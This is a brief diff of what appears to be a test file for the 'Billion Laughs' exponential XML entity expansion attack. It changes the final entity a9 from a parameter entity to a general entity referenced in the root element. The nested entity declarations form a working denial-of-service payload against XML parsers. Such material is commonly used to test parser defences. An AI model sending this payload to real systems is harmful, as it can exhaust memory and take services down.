@@ -14,6 +14,6 @@ description: Exponential Entity Expansion ("Billion Laughs") Attack with Paramte
   <!ENTITY % a6 "%a5;%a5;%a5;%a5;%a5;%a5;%a5;%a5;%a5;%a5;">
   <!ENTITY % a7 "%a6;%a6;%a6;%a6;%a6;%a6;%a6;%a6;%a6;%a6;">
   <!ENTITY % a8 "%a7;%a7;%a7;%a7;%a7;%a7;%a7;%a7;%a7;%a7;">
-  <!ENTITY % a9 "%a8;%a8;%a8;%a8;%a8;%a8;%a8;%a8;%a8;%a8;">
+  <!ENTITY a9 "%a8;%a8;%a8;%a8;%a8;%a8;%a8;%a8;%a8;%a8;">
 ]>
 <root>&a9;</root>
